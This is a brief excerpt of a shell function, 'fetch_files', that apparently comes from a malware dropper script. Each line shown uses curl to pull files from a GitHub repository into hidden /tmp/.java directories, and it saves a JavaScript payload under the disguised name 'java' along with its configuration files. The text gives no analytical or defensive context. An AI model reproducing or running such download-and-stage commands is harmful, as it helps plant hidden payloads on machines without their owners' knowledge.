...
function fetch_files() {
    ...
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/de-pxl/n1.conf -o cfg.conf
    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o java
    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/de-pxl/n1.json -o conf.json
